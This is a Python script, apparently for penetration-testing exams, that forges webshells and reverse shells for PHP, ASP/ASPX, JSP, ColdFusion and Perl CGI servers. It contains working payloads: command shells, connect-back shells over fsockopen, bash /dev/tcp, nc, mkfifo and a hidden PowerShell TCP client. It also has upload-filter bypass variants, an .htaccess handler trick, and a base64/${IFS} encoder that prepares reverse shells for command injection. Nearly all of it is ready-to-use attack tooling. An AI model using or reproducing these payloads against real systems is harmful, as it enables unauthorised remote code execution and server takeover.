#!/usr/bin/env python3
"""
webshell-forge.py  v1.2.0
Stack-aware webshell forge. Generates cmd + reverse shells for a given server
stack, clones them across every execute-able extension, and adds double-ext /
case / trailing-dot / magic-byte bypasses. Writes an ffuf wordlist to find which
extension actually executes.

Blocked on .php? The server may still run .phtml/.phar/.php5. IIS: .aspx/.ashx.
Tomcat: .jsp/.jspx. ColdFusion: .cfm. This stamps your payload into all of them.

stdlib only -- no pip, runs on a bare Kali/exam box.
Run with NO args (or -i) for interactive mode.

Examples:
  webshell-forge.py                              # interactive
  webshell-forge.py -s php                       # php cmd shell, all php exts
  webshell-forge.py -s php -t reverse --lport 443    # php reverse (tun0 auto LHOST)
  webshell-forge.py -s aspx -b -w                # IIS + bypasses + wordlist
  webshell-forge.py -p myshell.php -s php        # clone YOUR payload instead
  webshell-forge.py -s all -b -w -u http://$ip/uploads
  webshell-forge.py -e --lhost 10.10.14.5 --lport 443     # revshell encoder (cmd injection)
"""
import argparse, os, sys, shutil, subprocess, re
from pathlib import Path
from types import SimpleNamespace

# ── STACK PROFILES: extensions each handler will execute ──────────────────────
PROFILES = {
    "php":  ["php", "php3", "php4", "php5", "php7", "phtml", "phar", "pht", "phps", "shtml"],
    "asp":  ["asp", "asa", "cer", "cdx"],
    "aspx": ["aspx", "ashx", "asmx", "asax", "ascx"],
    "jsp":  ["jsp", "jspx", "jspf", "jsw", "jsv", "war"],
    "cfm":  ["cfm", "cfml", "cfc"],
    "cgi":  ["cgi", "pl", "pm"],
}

# ── SHELL TEMPLATES: cmd (?c=) and reverse ({LHOST}/{LPORT}) per stack ─────────
# add a shell = add a template. missing reverse falls back to cmd + a helper.
SHELLS = {
    "php": {
        "cmd": '<?php system($_GET["c"]); ?>\n',
        "reverse": '<?php $s=@fsockopen("{LHOST}",{LPORT});'
                   '$p=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$x); ?>\n',
    },
    "asp": {
        "cmd": '<% eval request("c") %>\n',
    },
    "aspx": {
        "cmd": '<%@ Page Language="Jscript"%><% eval(Request.Item["c"],"unsafe"); %>\n',
    },
    "jsp": {
        "cmd": '<% Runtime.getRuntime().exec(request.getParameter("c")); %>\n',
        "reverse": '<% Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",'
                   '"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"}); %>\n',
    },
    "cfm": {
        "cmd": '<cfexecute name="cmd.exe" arguments="/c #url.c#" timeout="10"></cfexecute>\n',
    },
    "cgi": {
        "cmd": '#!/usr/bin/perl\nprint "Content-type: text/html\\n\\n";'
               '\nuse CGI;system(CGI->new->param("c"));\n',
        "reverse": '#!/usr/bin/perl\nuse Socket;$i="{LHOST}";$p={LPORT};'
                   'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
                   'connect(S,sockaddr_in($p,inet_aton($i)));'
                   'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
                   'exec("/bin/sh -i");\n',
    },
}
# PowerShell reverse one-liner to run THROUGH a cmd shell on Windows stacks:
PS_REV = ("powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient("
          "'{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
          "while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding)"
          ".GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write("
          "([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}\"")

SHELLX_PHP = """<?php
// Universal PHP reverse shell — Linux + Windows
// Usage: shell.php?ip={LHOST}&port={LPORT}  (defaults below already stamped)
// Or hardcode below as fallback

$ip   = isset($_GET['ip'])   ? $_GET['ip']   : '{LHOST}';
$port = isset($_GET['port']) ? $_GET['port'] : '{LPORT}';

// Detect OS and pick the right shell
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    // Windows — use cmd.exe
    $shell = 'cmd.exe';
} else {
    // Linux/Unix — use bash if available, fall back to sh
    $shell = file_exists('/bin/bash') ? '/bin/bash' : '/bin/sh';
}

set_time_limit(0);
$sock = fsockopen($ip, (int)$port, $errno, $errstr, 30);
if (!$sock) { die("$errstr ($errno)\\n"); }

$descriptorspec = [
    0 => ['pipe', 'r'],
    1 => ['pipe', 'w'],
    2 => ['pipe', 'w'],
];

$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { die("Can't spawn shell\\n"); }

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock,     0);

while (!feof($sock) && !feof($pipes[1])) {
    $r = [$sock, $pipes[1], $pipes[2]];
    $w = $e = null;
    stream_select($r, $w, $e, null);

    if (in_array($sock,      $r)) fwrite($pipes[0], fread($sock,      1400));
    if (in_array($pipes[1],  $r)) fwrite($sock,     fread($pipes[1],  1400));
    if (in_array($pipes[2],  $r)) fwrite($sock,     fread($pipes[2],  1400));
}

fclose($sock);
array_map('fclose', $pipes);
proc_close($process);
"""

# swap the minimal php reverse stub for the fuller universal shellx.php
SHELLS["php"]["reverse"] = SHELLX_PHP

IMG_EXTS = ["jpg", "jpeg", "png", "gif"]
MAGIC = b"GIF89a;\n"   # content-sniff bypass; PHP ignores leading bytes


def col(t, code):
    return f"\033[{code}m{t}\033[0m" if sys.stdout.isatty() else t


def detect_lhost():
    """Best-effort tun0 IP (OSCP VPN), then default-route IP, else None."""
    for iface in ("tun0", "tap0"):
        try:
            out = subprocess.check_output(["ip", "-4", "addr", "show", iface],
                                          text=True, stderr=subprocess.DEVNULL)
            m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
            if m:
                return m.group(1)
        except Exception:
            pass
    try:
        out = subprocess.check_output(["ip", "route", "get", "1.1.1.1"],
                                      text=True, stderr=subprocess.DEVNULL)
        m = re.search(r"src (\d+\.\d+\.\d+\.\d+)", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    return None


def build_payload(args, stack):
    """Return (bytes, stem). -p file wins; else a generated cmd/reverse shell."""
    if args.payload:
        p = Path(args.payload)
        if not p.is_file():
            sys.exit(col(f"[!] payload not found: {p}", 31))
        return p.read_bytes(), p.stem

    lib = SHELLS.get(stack, {})
    want = args.type
    if want == "reverse" and "reverse" not in lib:
        # no native reverse for this stack -> cmd shell + PS helper printed later
        print(col(f"[!] no native reverse for {stack}; using cmd shell "
                  f"(run the PowerShell reverse through ?c=)", 33))
        want = "cmd"
    tmpl = lib.get(want) or lib["cmd"]
    tmpl = tmpl.replace("{LHOST}", args.lhost or "LHOST").replace("{LPORT}", str(args.lport))
    return tmpl.encode(), args.name


def bypass_names(stem, exts):
    names, primary = [], exts[:3]
    for e in primary:
        for img in IMG_EXTS:
            names.append(f"{stem}.{img}.{e}")
        names.append(f"{stem}.{e}.jpg")
    e0 = exts[0]
    names += [f"{stem}.{e0.upper()}", f"{stem}.{e0.capitalize()}",
              f"{stem}.{e0[:-1]}{e0[-1].upper()}", f"{stem}.{e0}."]
    return names



# ── ENCODER: reverse shell -> injection-safe forms ────────────────────────────
def encode_revshell(lhost, lport, shell="bash"):
    """Emit a reverse shell in forms that survive a filename/param -> shell -> Burp
    boundary. base64 avoids shell metacharacters; the wrapper decodes+executes on
    the target. This is the Vanity pattern: OS command injection through a hostile
    boundary where spaces/quotes/redirects get mangled."""
    import base64, urllib.parse

    raw = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "sh":   f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "nc":   f"nc {lhost} {lport} -e /bin/bash",
        "mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
    }.get(shell, f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")

    b64 = base64.b64encode(raw.encode()).decode()            # single line, -w0 equiv
    inject = f";echo {b64}|base64 -d|bash;"                    # terminate + run
    inject_ifs = f";echo${{IFS}}{b64}|base64${{IFS}}-d|bash;"    # spaces filtered
    url_once = urllib.parse.quote(inject, safe="")             # for Burp (encode ONCE)

    out = []
    C = lambda t,c: col(t,c)
    out.append(C("=== reverse shell encoder ===", 36))
    out.append(f"[*] target : {lhost}:{lport}  ({shell})")
    out.append("")
    out.append(C("[1] raw (paste into a shell ON THE TARGET only):", 33))
    out.append("    " + raw)
    out.append("")
    out.append(C("[2] base64 (the blob):", 33))
    out.append("    " + b64)
    out.append("")
    out.append(C("[3] inject-ready (drop into filename/param injection point):", 33))
    out.append("    " + inject)
    out.append("")
    out.append(C("[4] ${IFS} variant (when SPACES are filtered):", 33))
    out.append("    " + inject_ifs)
    out.append("")
    out.append(C("[5] URL-encoded for Burp (send raw; do NOT let Burp encode again):", 33))
    out.append("    " + url_once)
    out.append("")
    out.append(C("[>] catch it:", 33) + f"  rlwrap -cAr nc -lvnp {lport}")
    out.append(C("[!] encoding layers:", 31) + " if the boundary decodes once, use [3];")
    out.append("    if it double-decodes (Burp + server), don't pre-encode -- use [3] raw.")
    out.append("    NEVER pipe these to bash on Kali -- they run WHERE executed (target only).")
    print("\n".join(out))
    return raw, b64, inject


def forge(args):
    stacks = list(PROFILES) if args.stack == "all" else [args.stack]
    out = Path(args.out)
    if args.clean and out.exists():
        shutil.rmtree(out)
    out.mkdir(parents=True, exist_ok=True)

    print(col("=== webshell-forge v1.2.0 ===", 36))
    print(f"[*] stacks : {', '.join(stacks)}")
    print(f"[*] shell  : {'your file' if args.payload else args.type}"
          + (f"  ({args.lhost or 'LHOST'}:{args.lport})"
             if args.type == 'reverse' and not args.payload else ""))
    print(f"[*] outdir : {out}{'  (cleaned)' if args.clean else ''}")
    print(f"[*] magic  : {'GIF89a prepended' if args.magic else 'off'}")
    print()

    all_names = []
    for stack in stacks:
        exts = PROFILES[stack]
        data, stem = build_payload(args, stack)
        if args.magic:
            data = MAGIC + data
        print(col(f"[+] {stack}", 33))
        names = [f"{stem}.{e}" for e in exts]
        if args.bypass:
            names += bypass_names(stem, exts)
        for n in names:
            (out / n).write_bytes(data)
            all_names.append(n)
            print("    " + col("+", 32) + f" {n}")
        if args.bypass and stack == "php":
            (out / ".htaccess").write_text(f"AddType application/x-httpd-php .{stem}x\n")
            print("    " + col("+", 32) + f" .htaccess (upload too, then use .{stem}x)")

    seen, ordered = set(), []
    for n in all_names:
        if n not in seen:
            seen.add(n); ordered.append(n)
    if args.wordlist:
        (out / "shells.txt").write_text("\n".join(ordered) + "\n")
        print("\n" + col(f"[*] wrote {out}/shells.txt ({len(ordered)} names)", 36))

    print("\n" + col(f"[+] {len(all_names)} payloads written to {out}/", 36))

    # ── NEXT STEPS — copy/paste, in order ────────────────────────────────────
    stem0 = build_payload(args, stacks[0])[1]
    ext0  = PROFILES[stacks[0]][0]
    U     = args.url or "http://TARGET/uploads"
    print("\n" + col("┌─ NEXT STEPS ───────────────────────────────────────────", 36))
    print(col("│", 36) + " 1. upload every file in " + col(f"{out}/", 32) +
          " via the app's form / Burp Intruder /")
    print(col("│", 36) + "    a curl loop:")
    print(col("│", 36) + col(f"    for f in {out}/*; do curl -s -F 'file=@'$f {U}/ -o /dev/null; done", 32))
    if args.wordlist:
        print(col("│", 36) + " 2. find which extension the server EXECUTES (non-zero size = ran):")
        print(col("│", 36) + col(f"    ffuf -u {U}/FUZZ -w {out}/shells.txt -mc 200 -fs 0", 32))
    if args.type == "reverse" and not args.payload:
        lh = args.lhost or "LHOST"; lp = args.lport
        print(col("│", 36) + " 3. start your listener, THEN trigger the shell:")
        print(col("│", 36) + col(f"    rlwrap -cAr nc -lvnp {lp}", 33) + col("   ← run this first", 90))
        print(col("│", 36) + col(f"    curl 'http://TARGET/{stem0}.{ext0}'", 32) +
              col(f"   (LHOST {lh}:{lp} already baked in)", 90))
        print(col("│", 36) + col(f"    override on the fly: ...{stem0}.{ext0}?ip=<LHOST>&port=<LPORT>", 90))
        if any("reverse" not in SHELLS.get(s, {}) for s in stacks):
            ps = PS_REV.replace("{LHOST}", lh).replace("{LPORT}", str(lp))
            print(col("│", 36) + col("    Windows stack — no native reverse; run this via ?c= :", 90))
            print(col("│", 36) + "    " + col(ps, 32))
    else:
        print(col("│", 36) + " 3. confirm execution:")
        print(col("│", 36) + col(f"    curl '{U}/{stem0}.{ext0}?c=id'", 32))
        print(col("│", 36) + col("    then swap ?c=id for a reverse shell (see: webshell-forge -e)", 90))
    print(col("└────────────────────────────────────────────────────────", 36))


# ── INTERACTIVE MODE ──────────────────────────────────────────────────────────
def ask(prompt, default=None, choices=None):
    d = col(f" [{default}]", 90) if default is not None else ""
    while True:
        try:
            v = input(col(f"  {prompt}", 36) + d + col(" > ", 36)).strip()
        except (EOFError, KeyboardInterrupt):
            print(col("\n[!] cancelled", 31)); sys.exit(0)
        if not v and default is not None:
            return default
        if choices and v and v not in choices:
            print(col(f"    ! pick one of: {', '.join(choices)}", 31)); continue
        if v or default is not None:
            return v


def ask_int(prompt, default):
    while True:
        v = ask(prompt, str(default))
        if str(v).isdigit() and 0 < int(v) < 65536:
            return int(v)
        print(col("    ! enter a port 1-65535", 31))


def ask_lhost(auto):
    """Prompt for LHOST, showing the auto-detected tun0 IP as default."""
    if auto:
        print(col(f"    (detected tun0: {auto})", 90))
    while True:
        v = ask("LHOST", auto or None)
        if v and re.match(r"^\d+\.\d+\.\d+\.\d+$", v):
            return v
        if v == auto and auto:
            return auto
        print(col("    ! that doesn't look like an IP — check `ip a show tun0`", 31))


def yesno(prompt, default=False):
    d = col(" [Y/n]", 90) if default else col(" [y/N]", 90)
    try:
        v = input(col(f"  {prompt}", 36) + d + col(" > ", 36)).strip().lower()
    except (EOFError, KeyboardInterrupt):
        print(col("\n[!] cancelled", 31)); sys.exit(0)
    if not v:
        return default
    return v.startswith("y")


def banner():
    print(col(r"""
  webshell-forge  ·  v1.2.0
  stack-aware shells + upload-filter bypass + injection encoder
""", 36))


MENU = """  What are you doing?

    """ + col("1", 32) + """) PHP upload   — shells + bypasses + ffuf wordlist   """ + col("(most common)", 90) + """
    """ + col("2", 32) + """) IIS upload   — .aspx/.ashx shells + bypasses
    """ + col("3", 32) + """) Reverse shell — PHP connect-back (shellx)
    """ + col("4", 32) + """) Encoder      — base64 revshell for command injection
    """ + col("5", 32) + """) Custom       — every option, step by step
"""


def interactive():
    banner()
    print(MENU)
    choice = ask("choose", "1", ["1", "2", "3", "4", "5"])
    auto = detect_lhost()

    # ---- PRESETS: sensible defaults, minimal prompts ----
    if choice == "1":   # PHP upload — the 90% case
        print(col("\n  → PHP upload attack: cmd shells across all php exts, bypasses on, wordlist on.\n", 90))
        a = _preset(stack="php", type="cmd", bypass=True, magic=True, wordlist=True)
        a.url = ask("target upload URL (blank = skip ffuf line)", "") or None
        print(); return forge(a)

    if choice == "2":   # IIS upload
        print(col("\n  → IIS upload attack: aspx cmd shells + bypasses + wordlist.\n", 90))
        a = _preset(stack="aspx", type="cmd", bypass=True, magic=True, wordlist=True)
        a.url = ask("target upload URL (blank = skip ffuf line)", "") or None
        print(); return forge(a)

    if choice == "3":   # PHP reverse
        print(col("\n  → PHP reverse shell (shellx). Start a listener after.\n", 90))
        lhost = ask_lhost(auto)
        lport = ask_int("LPORT", 443)
        a = _preset(stack="php", type="reverse", bypass=True, magic=True, wordlist=True,
                    lhost=lhost, lport=lport)
        a.url = ask("target upload URL (blank = skip ffuf line)", "") or None
        print(); return forge(a)

    if choice == "4":   # Encoder
        print(col("\n  → Reverse-shell encoder for command injection.\n", 90))
        lhost = ask_lhost(auto)
        lport = ask_int("LPORT", 443)
        shell = ask("shell flavour", "bash", ["bash", "sh", "nc", "mkfifo"])
        print(); return encode_revshell(lhost, lport, shell)

    # ---- CUSTOM: full control ----
    print(col("\n  → Custom forge — every option.\n", 90))
    a = SimpleNamespace(payload=None, clean=False)
    a.stack = ask("stack", "php", list(PROFILES) + ["all"])
    a.type = ask("shell type", "cmd", ["cmd", "reverse"])
    a.lhost, a.lport = None, 443
    if a.type == "reverse":
        a.lhost = ask_lhost(auto)
        a.lport = ask_int("LPORT", 443)
    own = ask("use your own payload file? (path, blank = generate)", "")
    if own:
        a.payload = own
    a.name = ask("base filename stem", "shell")
    a.out = ask("output dir", "./shells")
    a.bypass = yesno("add bypass variants (double-ext / case / trailing)?", True)
    a.magic = yesno("prepend GIF89a magic bytes?", True)
    a.wordlist = yesno("write shells.txt wordlist?", True)
    a.url = ask("target upload URL for ffuf line (blank = skip)", "") or None
    a.clean = yesno("wipe output dir first?", False)
    print()
    forge(a)


def _preset(stack, type, bypass, magic, wordlist, lhost=None, lport=443):
    """Build an args namespace with the common defaults pre-filled."""
    return SimpleNamespace(
        payload=None, stack=stack, type=type, lhost=lhost, lport=lport,
        name="shell", out="./shells", bypass=bypass, magic=magic,
        wordlist=wordlist, url=None, clean=False,
    )


def main():
    ap = argparse.ArgumentParser(
        description="Stack-aware webshell forge -- generates & clones shells (stdlib only).",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    ap.add_argument("-i", "--interactive", action="store_true", help="menu-driven mode")
    ap.add_argument("-p", "--payload", help="your own payload file (overrides generated shell)")
    ap.add_argument("-s", "--stack", default="php", choices=list(PROFILES) + ["all"],
                    help="server stack (default: php)")
    ap.add_argument("-t", "--type", default="cmd", choices=["cmd", "reverse"],
                    help="generated shell type (default: cmd)")
    ap.add_argument("--lhost", help="reverse-shell callback IP (default: auto-detect tun0)")
    ap.add_argument("--lport", type=int, default=443, help="reverse-shell port (default: 443)")
    ap.add_argument("-o", "--out", default="./shells", help="output dir (default: ./shells)")
    ap.add_argument("-n", "--name", default="shell", help="base filename stem (default: shell)")
    ap.add_argument("-b", "--bypass", action="store_true", help="add double-ext/case/trailing bypasses")
    ap.add_argument("-m", "--magic", action="store_true", help="prepend GIF89a magic bytes")
    ap.add_argument("-w", "--wordlist", action="store_true", help="write shells.txt for ffuf")
    ap.add_argument("-u", "--url", help="print ffuf line against URL/FUZZ")
    ap.add_argument("-e", "--encode", action="store_true",
                    help="reverse-shell encoder for command injection (base64/URL/${IFS})")
    ap.add_argument("--shell", default="bash", choices=["bash","sh","nc","mkfifo"],
                    help="reverse shell flavour for --encode (default: bash)")
    ap.add_argument("--clean", action="store_true", help="wipe outdir before writing")

    # no args at all -> interactive
    if len(sys.argv) == 1:
        return interactive()
    args = ap.parse_args()
    if args.interactive:
        return interactive()
    if args.encode:
        lhost = args.lhost or detect_lhost() or 'LHOST'
        return encode_revshell(lhost, args.lport, args.shell)
    if args.type == "reverse" and not args.lhost and not args.payload:
        args.lhost = detect_lhost()
    forge(args)


if __name__ == "__main__":
    main()
